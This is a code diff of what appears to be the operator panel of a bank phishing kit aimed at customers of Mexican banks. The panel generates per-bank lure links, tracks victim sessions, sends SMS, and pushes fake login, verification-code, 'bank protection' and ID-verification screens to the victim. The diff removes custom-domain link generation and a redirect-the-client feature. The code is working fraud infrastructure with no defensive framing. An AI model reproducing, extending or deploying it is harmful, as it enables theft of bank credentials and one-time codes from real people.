@@ -17,7 +17,6 @@ import TelegramBotManagement from '@/components/admin/TelegramBotManagement';
 import { MessageSender } from '@/components/admin/MessageSender';
 import SubscriptionInfo from '@/components/admin/SubscriptionInfo';
 import { IdentityVerificationPanel } from '@/components/admin/IdentityVerificationPanel';
-import { LinksManagement } from '@/components/admin/LinksManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { FileManager } from '@/components/admin/FileManager';
 import { SessionDetails } from '@/components/admin/SessionDetails';
@@ -34,7 +33,7 @@ export default function AdminPanel() {
   const { toast } = useToast();
   const { user, logoutMutation } = useAuth();
   const [activeBank, setActiveBank] = useState<string>("todos");
-  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms' | 'qr' | 'telegram' | 'messages' | 'identity' | 'links'>('current');
+  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms' | 'qr' | 'telegram' | 'messages' | 'identity'>('current');
   
   // Actualizar el banco activo cuando el usuario cambia
   useEffect(() => {
@@ -121,11 +120,6 @@ export default function AdminPanel() {
   const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
   const [smsMessage, setSmsMessage] = useState('');
   const [isSendingSms, setIsSendingSms] = useState(false);
-  const [selectedDomainId, setSelectedDomainId] = useState<number | null>(null);
-  
-  // Estado para modal de redirección
-  const [isRedirectDialogOpen, setIsRedirectDialogOpen] = useState(false);
-  const [redirectUrl, setRedirectUrl] = useState('');
 
   // Determinar si es un usuario regular o administrador
   const isAdmin = user?.role === 'admin';
@@ -136,21 +130,6 @@ export default function AdminPanel() {
   const { socket, connected, sendMessage } = useWebSocket("/ws");
 
   // Fetch sessions from API
-  // Consulta para obtener dominios personalizados
-  const { data: customDomains = [] } = useQuery({
-    queryKey: ['/api/custom-domains'],
-    queryFn: async () => {
-      const response = await fetch('/api/custom-domains', {
-        credentials: 'include'
-      });
-      if (!response.ok) {
-        return [];
-      }
-      return response.json();
-    },
-    enabled: user?.role === 'admin'
-  });
-
   // Consulta específica que garantice la obtención de sesiones guardadas
   const { data: initialSessions, isLoading, refetch: refresh } = useQuery({
     queryKey: ['/api/sessions', activeTab],
@@ -255,62 +234,6 @@ export default function AdminPanel() {
       });
     }
   });
-
-  // Función para regenerar enlace con dominio personalizado
-  const regenerateLinkWithDomain = async (domainId: number) => {
-    if (!domainId) {
-      toast({
-        title: "Error",
-        description: "Selecciona un dominio válido",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    try {
-      const bancoParaEnlace = activeBank === 'todos' ? 'LIVERPOOL' : activeBank;
-      
-      const response = await fetch('/api/generate-link-custom', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        credentials: 'include',
-        body: JSON.stringify({
-          banco: bancoParaEnlace,
-          domainId: domainId
-        })
-      });
-
-      if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.message || 'Error al generar enlace');
-      }
-
-      const data = await response.json();
-      
-      setClientLink(data.link);
-      setClientCode(data.code);
-      
-      const selectedDomain = customDomains.find((d: any) => d.id === domainId);
-      
-      toast({
-        title: "Enlace regenerado",
-        description: `Nuevo enlace generado con ${selectedDomain?.name || 'dominio personalizado'}: ${data.code}`
-      });
-
-      // Actualizar la lista de sesiones
-      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
-      
-    } catch (error: any) {
-      console.error('Error regenerating link:', error);
-      toast({
-        title: "Error",
-        description: error.message || "Error al regenerar el enlace",
-        variant: "destructive"
-      });
-    }
-  };
 
   // Socket event handlers
   useEffect(() => {
@@ -576,13 +499,9 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "redireccion"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
       console.log("Activando modal para:", screen);
-      if (screen === "redireccion") {
-        setIsRedirectDialogOpen(true);
-      } else {
-        setActiveModal(screen);
-      }
+      setActiveModal(screen);
       return;
     }
     
@@ -758,26 +677,6 @@ export default function AdminPanel() {
     closeModal();
   };
 
-  const handleRedirectConfirm = () => {
-    if (!redirectUrl.trim()) {
-      toast({
-        title: "URL requerida",
-        description: "Debe ingresar una URL válida para redireccionar.",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    sendScreenChange({
-      tipo: 'mostrar_redireccion',
-      sessionId: selectedSessionId,
-      url: redirectUrl
-    });
-    
-    setIsRedirectDialogOpen(false);
-    setRedirectUrl('');
-  };
-
 
   
   // Manejar el envío de SMS
@@ -866,17 +765,16 @@ export default function AdminPanel() {
               <p className="text-[#00aaff]">Panel / Accesos</p>
               <h1 className="text-xl md:text-2xl font-bold mb-3">Panel Accesos</h1>
               
-              <div className="mt-2 flex flex-col md:flex-row md:items-end gap-4">
-                <div className="flex-1">
-                  <label htmlFor="pantallaControl" className="text-sm text-gray-400">
-                    Acciones / Control de Pantalla:
-                  </label>
-                  <select 
-                    id="pantallaControl" 
-                    className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
-                    onChange={(e) => handleScreenChange(e.target.value)}
-                    value=""
-                  >
+              <div className="mt-2">
+                <label htmlFor="pantallaControl" className="text-sm text-gray-400">
+                  Acciones / Control de Pantalla:
+                </label>
+                <select 
+                  id="pantallaControl" 
+                  className="mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64"
+                  onChange={(e) => handleScreenChange(e.target.value)}
+                  value=""
+                >
                   <option value="">Selecciona una opción</option>
                   <option value="login">1. Login</option>
                   <option value="codigo">2. Código de verificación</option>
@@ -892,20 +790,7 @@ export default function AdminPanel() {
                   <option value="proteccion_bancaria">12. Protección Bancaria</option>
                   <option value="proteccion_saldo">13. Protección de Saldo</option>
                   <option value="verificacion_id">14. Verificación ID</option>
-                  <option value="redireccion">15. Redirección a página</option>
                 </select>
-                </div>
-                {clientCode && (
-                  <div className="md:self-end">
-                    <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${
-                      activeBank === 'BANBAJIO' 
-                        ? 'text-white bg-[#4D2C91]' 
-                        : 'text-green-400 bg-[#1a3e1a]'
-                    }`}>
-                      Código: <span className="text-xl tracking-wider ml-1">{clientCode}</span>
-                    </span>
-                  </div>
-                )}
               </div>
             </div>
             
@@ -914,109 +799,97 @@ export default function AdminPanel() {
         </div>
         
         {/* Link Panel */}
-        <div className="mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg">
-          <div className="flex flex-col gap-4">
-            
-            {/* Selector de bancos arriba de dominios disponibles */}
-            <div className="flex flex-col md:flex-row md:items-center gap-2 mb-4">
-              <span className="font-semibold">Banco:</span>
-              <select 
-                id="filtroBanco" 
-                className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-full md:w-auto"
-                value={activeBank}
-                onChange={(e) => setActiveBank(e.target.value)}
+        <div className="mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg flex flex-col md:flex-row gap-4 md:gap-0 md:justify-between md:items-center">
+          <div className="flex flex-col md:flex-row md:items-center gap-3 md:space-x-2">
+            {/* En móvil, botones de acción primero (encima de los enlaces) por solicitud del usuario */}
+            <div className="flex space-x-2 order-first mb-2 md:mb-0 md:order-last">
+              <button 
+                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                onClick={copyLink}
               >
-              {user?.allowedBanks === 'all' || user?.role === 'admin' ? (
-                <>
-                  <option value="todos">Todos los bancos</option>
-                  <option value="LIVERPOOL">LIVERPOOL</option>
-                  <option value="CITIBANAMEX">CITIBANAMEX</option>
-                  <option value="BANBAJIO">BANBAJIO</option>
-                  <option value="BANCOPPEL">BANCOPPEL</option>
-                  <option value="BANORTE">BANORTE</option>
-                  <option value="BBVA">BBVA</option>
-                  <option value="HSBC">HSBC</option>
-                  <option value="AMEX">AMEX</option>
-                  <option value="SANTANDER">SANTANDER</option>
-                  <option value="SCOTIABANK">SCOTIABANK</option>
-                  <option value="INVEX">INVEX</option>
-                  <option value="BANREGIO">BANREGIO</option>
-                  <option value="SPIN">SPIN</option>
-                  <option value="PLATACARD">PLATACARD</option>
-                  <option value="BANCO_AZTECA">BANCO AZTECA</option>
-                  <option value="BIENESTAR">BANCO BIENESTAR</option>
-                </>
-              ) : (
-                <>
-                  {user?.allowedBanks?.split(',').map(bank => (
-                    <option key={bank} value={bank}>
-                      {bank.toUpperCase()}
-                    </option>
-                  ))}
-                </>
-              )}
-            </select>
+                Copiar
+              </button>
+              <button 
+                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                onClick={() => generateLink.mutate()}
+              >
+                {generateLink.isPending ? 'Generando...' : 'Regenerar'}
+              </button>
+              <a 
+                href="/qr-generator"
+                className="text-sm text-white font-medium bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded flex items-center"
+              >
+                <svg xmlns="http://www.w3.org/2000/svg" className="mr-1 h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <rect x="3" y="3" width="18" height="18" rx="2" />
+                  <rect x="7" y="7" width="3" height="3" />
+                  <rect x="14" y="7" width="3" height="3" />
+                  <rect x="7" y="14" width="3" height="3" />
+                  <rect x="14" y="14" width="3" height="3" />
+                </svg>
+                QR
+              </a>
             </div>
             
-            <div className="flex flex-col md:flex-row md:items-center gap-2">
-              <span className="font-semibold">Dominios disponibles:</span>
-              <select 
-                className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-1 text-sm"
-                value={selectedDomainId || ''}
-                onChange={(e) => setSelectedDomainId(e.target.value ? parseInt(e.target.value) : null)}
-              >
-                <option value="">Seleccionar dominio...</option>
-                {customDomains
-                  .filter((domain: any) => domain.isActive)
-                  .map((domain: any) => (
-                    <option key={domain.id} value={domain.id}>
-                      {domain.name} ({domain.domain})
-                    </option>
-                  ))
-                }
-              </select>
-            </div>
-            
-            {/* Botones y enlace debajo de banco y dominios */}
-            <div className="flex flex-col gap-3">
-              <div className="flex items-center gap-2">
-                <button 
-                  className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-                  onClick={copyLink}
-                >
-                  Copiar
-                </button>
-                <button 
-                  className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-                  onClick={() => generateLink.mutate()}
-                >
-                  {generateLink.isPending ? 'Generando...' : 'Regenerar'}
-                </button>
-                <button 
-                  className="text-xs text-white bg-[#007bff] hover:bg-blue-700 px-3 py-1 rounded disabled:opacity-50"
-                  onClick={() => selectedDomainId && regenerateLinkWithDomain(selectedDomainId)}
-                  disabled={!selectedDomainId}
-                >
-                  Regenerar con dominio
-                </button>
-              </div>
-              
+            <div className="flex items-center gap-2">
+              <span className="font-semibold">Liga activa:</span>
               {clientLink && (
-                <div className="flex items-center">
-                  <a 
-                    href={clientLink} 
-                    target="_blank" 
-                    className="text-[#00aaff] text-sm md:text-base truncate"
-                  >
-                    {clientLink}
-                  </a>
-                </div>
+                <a 
+                  href={clientLink} 
+                  target="_blank" 
+                  className="text-[#00aaff] text-sm md:text-base truncate max-w-[140px] md:max-w-[200px] lg:max-w-none"
+                >
+                  {clientLink}
+                </a>
               )}
             </div>
             
-            
+            {clientCode && (
+              <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${
+                activeBank === 'BANBAJIO' 
+                  ? 'text-white bg-[#4D2C91]' 
+                  : 'text-green-400 bg-[#1a3e1a]'
+              }`}>
+                Código: <span className="text-xl tracking-wider ml-1">{clientCode}</span>
+              </span>
+            )}
           </div>
           
+          <select 
+            id="filtroBanco" 
+            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-full md:w-auto"
+            value={activeBank}
+            onChange={(e) => setActiveBank(e.target.value)}
+          >
+            {user?.allowedBanks === 'all' || user?.role === 'admin' ? (
+              <>
+                <option value="todos">Todos los bancos</option>
+                <option value="LIVERPOOL">LIVERPOOL</option>
+                <option value="CITIBANAMEX">CITIBANAMEX</option>
+                <option value="BANBAJIO">BANBAJIO</option>
+                <option value="BANCOPPEL">BANCOPPEL</option>
+                <option value="BANORTE">BANORTE</option>
+                <option value="BBVA">BBVA</option>
+                <option value="HSBC">HSBC</option>
+                <option value="AMEX">AMEX</option>
+                <option value="SANTANDER">SANTANDER</option>
+                <option value="SCOTIABANK">SCOTIABANK</option>
+                <option value="INVEX">INVEX</option>
+                <option value="BANREGIO">BANREGIO</option>
+                <option value="SPIN">SPIN</option>
+                <option value="PLATACARD">PLATACARD</option>
+                <option value="BANCO_AZTECA">BANCO AZTECA</option>
+                <option value="BIENESTAR">BANCO BIENESTAR</option>
+              </>
+            ) : (
+              <>
+                {user?.allowedBanks?.split(',').map(bank => (
+                  <option key={bank} value={bank}>
+                    {bank.toUpperCase()}
+                  </option>
+                ))}
+              </>
+            )}
+          </select>
         </div>
 
         {/* User Info & Logout */}
@@ -1147,8 +1020,6 @@ export default function AdminPanel() {
           <MessageSender />
         ) : activeTab === 'identity' && user?.role === 'admin' ? (
           <IdentityVerificationPanel />
-        ) : activeTab === 'links' && user?.role === 'admin' ? (
-          <LinksManagement />
         ) : (
           <div className="flex flex-col gap-4 h-full">
             {/* Session List */}
@@ -1219,61 +1090,6 @@ export default function AdminPanel() {
         onClose={closeModal} 
         onConfirm={handleSmsCompraConfirm} 
       />
-
-      {/* Modal de redirección */}
-      <Dialog open={isRedirectDialogOpen} onOpenChange={setIsRedirectDialogOpen}>
-        <DialogContent className="sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700">
-          <DialogHeader>
-            <DialogTitle className="flex items-center">
-              <svg className="mr-2 h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
-              </svg>
-              Redirección a página
-            </DialogTitle>
-            <DialogDescription className="text-gray-400">
-              Ingresa la URL a la que será redirigido el cliente.
-            </DialogDescription>
-          </DialogHeader>
-          
-          <div className="grid gap-4 py-4">
-            <div className="grid grid-cols-4 items-center gap-4">
-              <Label htmlFor="url" className="text-right">
-                URL
-              </Label>
-              <Input
-                id="url"
-                type="url"
-                value={redirectUrl}
-                onChange={(e) => setRedirectUrl(e.target.value)}
-                placeholder="https://ejemplo.com"
-                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white"
-              />
-            </div>
-          </div>
-          
-          <DialogFooter>
-            <Button
-              type="button"
-              variant="outline"
-              onClick={() => {
-                setIsRedirectDialogOpen(false);
-                setRedirectUrl('');
-              }}
-              className="border-gray-700 text-gray-300 hover:bg-gray-800"
-            >
-              Cancelar
-            </Button>
-            <Button
-              type="button"
-              onClick={handleRedirectConfirm}
-              disabled={!redirectUrl.trim()}
-              className="bg-[#007bff] hover:bg-blue-700 text-white"
-            >
-              Confirmar
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
 
       
       {/* Diálogo para enviar SMS */}
